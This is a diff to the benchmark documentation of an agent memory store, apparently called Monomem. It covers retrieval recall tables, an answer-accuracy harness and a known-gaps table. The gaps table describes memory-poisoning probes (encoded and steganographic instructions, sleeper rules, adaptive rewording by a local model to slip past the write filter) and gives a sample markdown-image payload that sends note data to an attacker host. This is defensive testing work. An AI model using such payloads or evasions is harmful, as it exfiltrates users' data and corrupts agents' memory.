@@ -251,17 +251,94 @@ monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [-
   `evidence` dialog ids; `--granularity session` writes one note per session and scores sessions.
 - **Questions.** LongMemEval's 30 abstention questions (`_abs`) have no gold session and are left out: 470 of
   500 are scored. LoCoMo questions with no usable evidence id are left out: 1,982 of 1,986.
-- **Three searches are scored.** `keyword` is `runSearch(mode: "keyword")`, the path behind `memory_search` (formerly `state_search`) and
+- **Up to four searches are scored.** `keyword` is `runSearch(mode: "keyword")`, the path behind `memory_search` (formerly `state_search`) and
   `GET /search`: FTS5/BM25 with every word first, then (since OneMemory 2.0.0, before the rename) notes matching some of the words, always ranked
   below full matches. `relevant` is `runRelevantSearch` (`memory_search` with `mode: "relevant"`, the 1.5 `state_relevant` tool, and `POST /relevant`): stop words
   dropped, any keyword qualifies, one BM25 OR query scaled by the share of keywords each note contains (before 2026-11-04:
-  per-keyword BM25 rankings fused with RRF; the keyword fallback used the same). `--mode hybrid` also scores
+  per-keyword BM25 rankings fused with RRF; the keyword fallback used the same). `--mode hybrid` also scores `runSearch(mode: "semantic")` (embedding cosine only) and
   `runSearch(mode: "hybrid")` (BM25 + embeddings; since 2026-11-04 a 0.5 / 0.5 blend of min-max-scaled scores, before
   that RRF) when an embedding server answers; otherwise it is reported as skipped.
 - **Metrics.** `R@5`, `R@10`: any gold session (or turn) in the top k. `Rall@5`, `Rall@10`: every gold one in the top 5 / 10
   (strict; `R@k` is the generous any-hit variant). In `--json`: `rAll5`, `rAll10`.
   `nDCG@10` with binary relevance. `MRR` over the top 50. Search latency p50/p95 per query; indexing time per
   haystack (single process, SQLite in a temp folder).
+
+### What retrieval does Monomem use?
+
+- **Default: keyword.** `memory_search` uses SQLite FTS5 (BM25 ranking, title weighted over body). No model, no network, nothing to set up.
+  It finds words, not meaning: a query with no word in common with the note will not find it.
+- **Optional: semantic and hybrid.** With `MONOMEM_EMBEDDINGS=on` (or `auto`) and an OpenAI-compatible embedding server you run yourself
+  (default `http://localhost:11434/v1/embeddings`, model `nomic-embed-text`; see [search.md](./search.md)), `mode: "semantic"` ranks by cosine
+  similarity of the embeddings alone and `mode: "hybrid"` fuses both. Hybrid is the default mode when embeddings are on. If the embedding
+  server is down, every mode falls back to keyword results.
+- **How hybrid fuses.** Each side's scores are min-max scaled to 0..1 within the search and blended 0.5 keyword / 0.5 semantic; a note found
+  by only one side gets 0 from the other (`blendHybrid` in `src/search-service.ts`; it replaced equal-weight RRF on 2026-11-04).
+  `docs/search.md` describes the blend (it said Reciprocal Rank Fusion until 2026-11-23).
+- **There is no reranker and no LLM in the retrieval path.** `relevant` is a second keyword mode (stop words dropped, any keyword matches).
+- **What the two benchmarks measure.** `monomem bench` (above) is a behaviour benchmark: keyword search on made-up unique words, stale-hit
+  rate at 1, 5 and 10. It says nothing about retrieval quality. `monomem bench --longmemeval` / `--locomo` measure retrieval quality: is the
+  right session (or turn) among the top k. They do not measure whether an agent then answers correctly.
+- **Choice of k.** The report now prints any-hit recall at k = 1, 3, 5, 10 and 20 for every mode (keyword, relevant, semantic, hybrid), not
+  only k = 5. k = 5 stays in the headline because it is the usual cut-off other memory projects publish, so numbers can be compared; the
+  other k values are there so that one k cannot hide a weakness. `Rall@k` (every gold session in the top k) is stricter.
+
+### Results, 2026-11-23: every mode, every k (new report)
+
+One Windows PC (RTX 5080), Node v24.18.0, code at the commit that added the `semantic` row and R@1/3/20. Embeddings: `nomic-embed-text` via local
+Ollama (`MONOMEM_EMBEDDINGS=on`, `MONOMEM_EMBED_URL=http://localhost:11434/v1/embeddings`). Run date 2026-11-23 (local time). No dataset was
+sampled randomly: LoCoMo is all 10 conversations and all 1,982 scorable questions; LongMemEval-S is the **first 150 of the 470 scorable
+questions in the file's order** (`--limit 150`, no seed), because a full 470-question hybrid run did not finish in this session (it takes
+about 45 minutes by extrapolation, embedding every session; the one attempt ended after 300 haystacks with no output, cause not found, and a second one
+shared the GPU with other jobs). The keyword-only full 470 run is given too. All values are percent, any gold hit in the top k.
+
+| Dataset (questions) | mode | R@1 | R@3 | R@5 | R@10 | R@20 | Rall@5 | Rall@10 |
+|---|---|---|---|---|---|---|---|---|
+| LongMemEval-S session (first 150 of 470) | keyword | 81.3 | 94.7 | 96.0 | 98.7 | 100.0 | 79.3 | 92.0 |
+| | relevant | 81.3 | 94.7 | 96.0 | 98.7 | 100.0 | 79.3 | 92.0 |
+| | semantic | 72.7 | 90.0 | 91.3 | 94.0 | 98.0 | 80.7 | 88.0 |
+| | hybrid | 89.3 | 97.3 | 98.7 | 99.3 | 99.3 | 89.3 | 96.0 |
+| LongMemEval-S session (all 470), keyword only | keyword | 87.4 | 96.4 | 97.4 | 98.9 | 99.8 | 86.0 | n/r |
+| | relevant | 87.2 | 96.4 | 97.4 | 98.9 | 99.8 | 86.0 | n/r |
+| LoCoMo-10 session (1,982) | keyword | 69.5 | 85.9 | 91.0 | 96.1 | 99.0 | 82.5 | 89.1 |
+| | relevant | 69.9 | 86.0 | 91.2 | 96.1 | 99.0 | 82.6 | 89.0 |
+| | semantic | 35.2 | 56.1 | 66.1 | 82.1 | 95.6 | 56.2 | 73.4 |
+| | hybrid | 69.9 | 87.1 | 92.2 | 96.9 | 99.3 | 83.0 | 90.4 |
+| LoCoMo-10 turn (1,982) | keyword | 35.8 | 59.6 | 67.6 | 77.0 | 83.8 | 58.5 | 66.1 |
+| | relevant | 35.9 | 59.4 | 67.5 | 76.9 | 83.6 | 58.4 | 66.2 |
+| | semantic | 23.8 | 43.5 | 51.9 | 62.4 | 72.7 | 44.0 | 53.1 |
+| | hybrid | 38.7 | 66.3 | 75.9 | 84.5 | 89.1 | 64.9 | 73.4 |
+
+(`n/r`: not recorded in the table; the run's JSON has it.) Reading it plainly:
+
+- **Semantic alone is worse than keyword in all 15 any-hit cells (5 values of k, 3 runs)**, and by a lot on LoCoMo
+  (R@5 66.1 vs 91.0 by session, 51.9 vs 67.6 by turn). On LongMemEval-S (first 150) it is lower at every k, though its strict Rall@5 (80.7)
+  is 1.4 above keyword's 79.3. `nomic-embed-text` is a small general model; a different embedder could do better or worse. Not tested.
+- **Hybrid is not always better than keyword.** At k = 20 on the LongMemEval-S subset it is lower (99.3 vs 100.0, one question of 150).
+  Everywhere else in this table it is equal or higher. The gain is largest on LoCoMo by turn (R@5 +8.3) and on LongMemEval-S strict Rall@5
+  (+10.0, 150 questions, so about 15 questions; read it as a direction, not a precise number). On LoCoMo by session R@1 is nearly level (69.9 vs 69.5).
+- **Where keyword is already near the ceiling** (R@10 and above by session) there is little left for embeddings to add; the cost is
+  latency: search p50 about 25 ms hybrid against 2 to 6 ms keyword on this PC, plus embedding every note when it is written.
+- **The semantic row's latency is not representative**: the hybrid search ran first and cached the query embedding.
+- **Run-to-run difference from the older tables below**: LoCoMo-10 turn keyword R@5 67.6 here against 67.4 on 2026-11-15, and hybrid 75.9
+  against 75.9 on 2026-11-14 (hybrid by turn, chat-import layout); small drift from ties and later ranking changes, not investigated.
+
+Subset, scope and limits: LongMemEval-S hybrid/semantic cover 150 questions (the first in file order), not all 470, so its confidence
+interval is wide (about +/- 4 points at 80%, +/- 2 at 96%). One embedding model, one machine, one run each (no repeat). No reranker was
+tried. The 2026-11-14 to 2026-11-19 tables below were measured on other code versions and are kept as measured.
+
+Reproduce (any dataset not in `~/.cache/monomem-bench` is downloaded there once from the sources above):
+
+```
+npm run build
+export MONOMEM_EMBEDDINGS=on MONOMEM_EMBED_URL=http://localhost:11434/v1/embeddings MONOMEM_EMBED_MODEL=nomic-embed-text MONOMEM_EMBED_TIMEOUT_MS=300000
+node dist/src/cli.js bench --locomo --mode hybrid --granularity session --json
+node dist/src/cli.js bench --locomo --mode hybrid --granularity turn --json
+node dist/src/cli.js bench --longmemeval --mode hybrid --limit 150 --json
+node dist/src/cli.js bench --longmemeval --json            # keyword and relevant only, all 470
+```
+
+If the embedding server goes down in the middle of a run, search silently falls back to keyword and the hybrid and semantic rows are then
+wrong: check that stderr shows no "embeddings call failed" line (a first run in this session did, and was discarded).
 
 ### Results, 2026-11-14 (measured for 1.5.0)
 
@@ -802,7 +879,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, OneMemory 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None is open.**
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, OneMemory 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None of those is open. Six new ones were opened on 2026-11-23** by the attack-expansion probes (scenarios F01 to F18, see [attack-expansion-2026-11-23.md](./attack-expansion-2026-11-23.md)): the rows marked **Open** below. They are real misses, kept as known gaps instead of being removed.
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -813,6 +890,15 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
 | `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in OneMemory 2.0.0**: a remote markdown image with a query string is held for review; README badge hosts are exempt. | E11 (now passes) |
 | `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Fixed in Monomem 1.5.0**: for the same writer, the same subject and a near tie, the newer note ranks first and the old one is kept right behind it, labelled `restated_by`; never for another writer, over a person-confirmed note, or for outside content. The two-step replace (A34) still removes the old value everywhere. | A33 (now passes); guards A35 to A38 |
+| `GAP-PROBE-CONTEXT` | Context-poisoning notes with no command words (a dated sleeper rule, a payment redirect, a false "correction", a policy override, a slow drip of harmless fragments) are stored and served. | **Open** (2026-11-23). Only the read-side banner, the writer label and the trust rules defend. | F01, F06 |
+| `GAP-PROBE-ENCODING` | Pig latin, acrostics, NATO spelling, upside-down text, regional-indicator letters, half of a split base64 blob, and an instruction split between a title and a source with a body between them. | **Open** (2026-11-23). Rot13, reversed text, Caesar shifts, numeric codes, base32, Morse and seven more languages were closed in the same round. | F08 |
+| `GAP-PROBE-TOOLSTYLE` | Tool-steering text inside a fact value or a source label. | **Open** (2026-11-23). | F10 |
+| `GAP-PROBE-STEGO` | Sparse zero-width marks (one every few letters) and a run of only three variation selectors. | **Open** (2026-11-23). | F12 |
+| `GAP-ADAPTIVE-REWRITE` | A local 7B model, told only whether the write gate stored a note, rewrote hostile goals until text that still carried the goal was stored in every field (title, body, tags, source, fact value): 43 of 60 goal-by-field cells with feedback, 57 of 60 with 30 blind rewordings and no feedback (the author's manual read of the winners lowers these to 29 and 50). The gate looks for instruction-shaped text; plain claims, polite requests and key=value tags carry the same meaning and match nothing. Only a model-based check, field-aware rules or read-side labelling close this class. Partly mitigated 2026-11-24 by claim rules for non-owner writers (14 of 47 held-out adaptive winners caught; F30 to F34 still fail because each expects every winner of a field to be held). | **Open** (2026-11-23). | F30 to F34 |
+| `GAP-ADAPTIVE-REWRITE-R2` | Round 2 of the same test (2026-11-24, fresh seeded qwen2.5:7b run, made after the claim-style rules and not used to design them): 44 of 60 goal-by-field cells with feedback and 52 of 60 blind still stored a text that carries the goal (round 1: 43 and 57). The claim rules held about 10% of tries (244 of 2,392) but the attacker moved to wordings they do not match. See docs/adaptive-attacker-round2-2026-11-24.md. Only a model-based check, field-aware rules or read-side labelling close this class. | **Open** (2026-11-24). | F35 to F39 |
+| `GAP-PROBE-GARAK-PYRIT` | Plain-English poisoning sentences (23 of 30 stored and served with no warning) and readable obfuscations (leetspeak, look-alike letters, spaced letters, NATO, acrostic) from garak 0.17.1 and PyRIT 1.2.1; encoded variants a model would have to decode. See docs/ai-redteam-tools-2026-11-23.md. | **Open** (2026-11-23). | F19, F20, F21, F22, F23 |
+| `GAP-PROBE-FLOOD` | Eight keyword-stuffed notes from an outside writer push the trusted answer out of the top five (keyword search, titles weigh five times a body). | **Fixed** on the 1.8.0 branch (2026-11-24): a writer's results past its first three are damped, and the search looks at 50+ candidates. | F02 |
+| `GAP-SUPERSEDE-ABUSE` | A write key (not admin) could preview and confirm replacing another writer's trusted (or pinned, or five) notes, and an agent could confirm its own preview. | **Fixed in 1.8.0**: replacing a note now needs a person (MCP connections and write-key apps are refused at the confirm; `MONOMEM_REPLACE_CONFIRM=agent` restores the old behaviour). F15, F16, F18 now pass; the markers were removed. | F15, F16, F17, F18 |
 
 **Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
 any-keyword search instead of one per keyword; "how many / total / every / list all" questions return twice the
@@ -894,3 +980,124 @@ log could not run or be read. Distrust rules, redaction markers and size are sho
 
 What it does not cover: the injection check is a pattern linter; reworded attacks and self-poisoning still get through. `--card` writes
 the result as a shareable SVG (grade, one word per check, date).
+
+## Synonyms and local model (2026-11-24)
+
+One PC, Node 24, fresh stores. Probe cases are tiny synthetic notes (n = 1 to 6 per case, 40 fillers): they show what a method can do at all, not a rate.
+
+| Case | Keyword before | Keyword + synonym table | Hybrid, local model (multilingual-e5-small, in process) |
+|---|---|---|---|
+| P1 synonyms (car, doctor, fix bug, buy, fired) | 2/5 | 5/5 | 5/5 |
+| M2 Japanese paraphrase | fail | pass (katakana long-vowel mark fix) | pass |
+| M2 French paraphrase | fail | fail | pass |
+| M2 Chinese paraphrase 2 (no shared character pair) | fail | fail | pass |
+| M3 English question, note in de / fr / es / zh | 0/4 | 0/4 | 4/4 (ranks 2, 1, 1, 3) |
+
+Still failing everywhere: C1b and C1c (a newer note that contradicts with different words, or by negation), F3 (keyword-stuffed decoys).
+Hybrid with the local model also fails T3 ("three months ago") and C1b rank 2, which plain keyword passes (T3) or fails differently.
+
+LongMemEval-S, first 150 questions, session level (`bench --longmemeval --limit 150`):
+
+| Mode | R@1 | R@5 | all-gold@5 | R@10 | search p50 / p95 | indexing 7,179 notes |
+|---|---|---|---|---|---|---|
+| keyword, before | 0.8133 | 0.9600 | 0.7933 | 0.9867 | 4.0 / 7.7 ms | 10 s |
+| keyword, synonym table | 0.8133 | 0.9600 | 0.7933 | 0.9867 | 4.7 to 6.5 / 8.7 to 10.4 ms (3 runs, machine busy) | 10 s |
+| semantic only, local model | 0.6933 | 0.8933 | 0.7800 | 0.9333 | 4.8 / 29 ms | 288 s |
+| hybrid, local model | 0.8667 | 0.9867 | 0.9067 | 1.0000 | 13.6 / 19.2 ms | 288 s |
+
+The synonym table changes no ranking on this set (identical to four decimals): it only widens a word that no found note contains.
+Latency of the table: 10,000 dense synthetic notes, 10 mixed questions, three alternating runs, p50 about 1 ms higher than before
+(7.4 vs 8.6 ms; this corpus is far denser than real notes, and the runs were noisy). Treat "about +1 ms" as an upper reading, not a precise figure.
+Hybrid is not the default: it needs files the person installs, costs about 40 ms per note written and 13.6 ms p50 per search here, and
+lost two of my contradiction/time probes that keyword passes.
+
+Not built, and why: co-occurrence / random-indexing vectors learned from the user's own notes (a personal store is small and its
+synonyms rarely co-occur, so there is nothing to learn from; not measured), and character n-gram hash vectors (they only help spelling variants, which the
+stemmer already covers; not measured). Cross-language recall without a model is not possible with a table this size.
+
+Reproduce: `scripts/install-local-embeddings.mjs`, then `MONOMEM_EMBEDDINGS=local node dist/src/cli.js bench --longmemeval --limit 150 --mode hybrid`.
+
+## Answer accuracy with local models (2026-11-25)
+
+Everything above measures retrieval or behaviour. Rivals (mem0, supermemory, Hindsight, Zep) publish answer accuracy: a reader model answers
+from the retrieved text and a judge model marks the answer. `bench/answer-accuracy.mjs` measures that for Monomem, with no paid API and nothing
+leaving the machine: the reader and the judge are local Ollama models.
+
+**These numbers are NOT comparable to rivals' published numbers.** They use a 7B reader and a different judge. Rivals use GPT-4o or newer
+readers and a GPT-4o judge. The reader alone moves a score by 10 or more points on the same memory (Hindsight's own table: supermemory 81.6
+with GPT-4o and 84.6 with GPT-5; Hindsight 83.6 with a 20B open reader and 91.4 with Gemini 3; see the 11-teardown-platforms notes). Compare the
+rows below with each other, never with a rival's headline.
+
+What one run does:
+
+- **Sample.** Eligible questions (LongMemEval-S without abstention questions, as in the retrieval bench; LoCoMo without category 5) are sorted
+  by `sha256(seed:id)` and the first `--n` are used. Same seed, same questions. Default seed `monomem-acc-1`, n 150.
+- **Conditions, same reader, same prompt, same sample.** Monomem keyword top-5 and top-10 sessions; Monomem hybrid top-5 and top-10 (with
+  `--hybrid` and an embedding server); plain Okapi BM25 over whole sessions (k1 1.5, b 0.75, no stemming, no stop list) top-5 and top-10;
+  full history in context (`--full`) only when it fits the context window, otherwise it is skipped and the skip is counted. LongMemEval-S
+  haystacks are about 115K tokens, so full history never fits a 32K window there; use `--dataset locomo --full` (conversations of roughly
+  10 to 25K tokens).
+- **Context.** Retrieved sessions are shown oldest first with their date, then the question date and the question. If a prompt is longer than
+  the budget (`--num-ctx` minus 2,048 tokens, estimated at 4 characters a token) the lowest-ranked sessions are dropped; the table does not hide
+  this (see `dropped` in `answers.jsonl`).
+- **Reader.** `qwen2.5:7b`, temperature 0, Ollama seed 42, 32K context, 128 answer tokens, thinking off. **Judge.** `gemma4:12b`, a different
+  model family from the reader (no self-grading), temperature 0, answers yes or no. The judge prompt follows the public LongMemEval judging
+  instructions (extra leniency for off-by-one days on temporal questions, and for old-plus-new values on knowledge-update questions); the
+  wording is ours, not byte-identical. The model names and prompt text are printed by `report` and live in `bench/answer-accuracy-lib.mjs`.
+- **Statistics.** Accuracy with a Wilson 95% interval; every condition against BM25 top-5 as a paired count (questions only one got right) with
+  an exact sign-test p-value; tokens in per question as reported by Ollama and tokens per correct answer; accuracy split by whether a gold
+  evidence session was in the context at all. A judge reply that is not yes or no counts as wrong and is reported.
+- **Judge check.** `spot` prints 20 seeded verdicts for a person to read; hand labels go in `hand.jsonl` and `spot` prints the agreement.
+  A second judge model can be run with `--judge <model>` (verdicts are stored per judge).
+
+Run (`ollama serve` running, models pulled):
+
+```
+npm run build
+node --max-old-space-size=6000 bench/answer-accuracy.mjs read   --n 150 --hybrid --out <dir>   # resumable
+node bench/answer-accuracy.mjs judge  --n 150 --out <dir>
+node bench/answer-accuracy.mjs report --n 150 --out <dir>
+node bench/answer-accuracy.mjs spot   --n 150 --out <dir>
+```
+
+For hybrid set `MONOMEM_EMBEDDINGS=on` and `MONOMEM_EMBED_URL=http://localhost:11434/v1/embeddings` (nomic-embed-text). The unit test
+(`test/answer-accuracy.test.ts`) drives the whole pipeline with a fake reader and judge, so CI needs no model.
+
+Limits to read before quoting anything: a 7B reader is weak, so absolute accuracy is low and mostly measures the reader; with n 150 an interval
+is about plus or minus 8 points, so differences of a few points between two conditions are noise (use the paired counts); the judge is a
+model and can be wrong (see the hand check below); one seed and one reader were run.
+
+
+### Result, 2026-11-25: LongMemEval-S, 60 questions (a smaller run than the 150 planned)
+
+The first run was meant to be 150 questions. Each reader call on a 14 to 25K-token prompt takes about 10 seconds on the RTX 5080 while it is shared,
+so 150 questions across 6 conditions would take about 3 hours; the run was cut to the first 60 of the same seeded order. Same seed
+`monomem-acc-1`, reader `qwen2.5:7b`, judge `gemma4:12b`, 32K context, temperature 0. Full history was not run (it never fits on LongMemEval-S).
+Raw answers, verdicts and the run settings are in the run folder (`answers.jsonl`, `verdicts-*.jsonl`, `run.json`); they are not committed.
+
+| Condition | n | correct | accuracy (Wilson 95% CI) | mean tokens in | tokens per correct | acc. if evidence in context | acc. if not |
+|---|---|---|---|---|---|---|---|
+| monomem-keyword-top5 | 60 | 32 | 53.3% (40.9 to 65.4) | 14274 | 26763 | 56.1% (32/57) | 0.0% (0/3) |
+| monomem-keyword-top10 | 60 | 33 | 55.0% (42.5 to 66.9) | 24309 | 44198 | 56.9% (33/58) | 0.0% (0/2) |
+| monomem-hybrid-top5 | 60 | 31 | 51.7% (39.3 to 63.8) | 13131 | 25414 | 53.4% (31/58) | 0.0% (0/2) |
+| monomem-hybrid-top10 | 60 | 31 | 51.7% (39.3 to 63.8) | 22903 | 44329 | 52.5% (31/59) | 0.0% (0/1) |
+| bm25-only-top5 | 60 | 32 | 53.3% (40.9 to 65.4) | 14015 | 26278 | 55.2% (32/58) | 0.0% (0/2) |
+| bm25-only-top10 | 60 | 34 | 56.7% (44.1 to 68.4) | 24732 | 43644 | 58.6% (34/58) | 0.0% (0/2) |
+
+monomem-keyword-top5 vs bm25-only-top5: 6 questions only the first got right, 6 only the second (n=60), exact sign-test p=1.000
+monomem-keyword-top10 vs bm25-only-top5: 6 questions only the first got right, 5 only the second (n=60), exact sign-test p=1.000
+monomem-hybrid-top5 vs bm25-only-top5: 4 questions only the first got right, 5 only the second (n=60), exact sign-test p=1.000
+monomem-hybrid-top10 vs bm25-only-top5: 5 questions only the first got right, 6 only the second (n=60), exact sign-test p=1.000
+bm25-only-top10 vs bm25-only-top5: 6 questions only the first got right, 4 only the second (n=60), exact sign-test p=0.754
+
+How to read it: with n 60 each interval is about plus or minus 12 points and no pair of conditions differs by more than 2 questions in the
+paired counts. **Monomem keyword, Monomem hybrid and plain BM25 tie** on this reader and this sample; "BM25 ties the memory system at this
+scale" matches what report 20 cites from the Ground Truth First paper (not re-read by us); we did not find otherwise on this sample. Top-10 costs about 1.7 times the tokens of top-5 for
+no measured gain. Tokens per correct answer is high (26K at top-5) because whole sessions are sent, not snippets; this bench says nothing
+about a snippet-level reader. When the gold session is not in the context at all the reader never gets it right (0 of 12 such answers),
+and when it is in the context accuracy is only 52 to 59%, so the 7B reader, not retrieval, is the limit here.
+
+Judge check: 20 verdicts were drawn with the seeded `spot` command. Fifteen were clear enough to label by reading the question, the gold answer and
+the reply (labelled by the AI agent that built the harness, not by a person; a person should repeat it): the judge agreed on 15 of 15. The other five
+(three long multi-step day counts, one short factual answer, and one preference question) were not labelled and are not counted. The judge was only ever checked on
+verdicts it gave, so that figure says little about missed errors (answers it marked wrong that were right); 5 of 20 unlabelled is the honest gap.
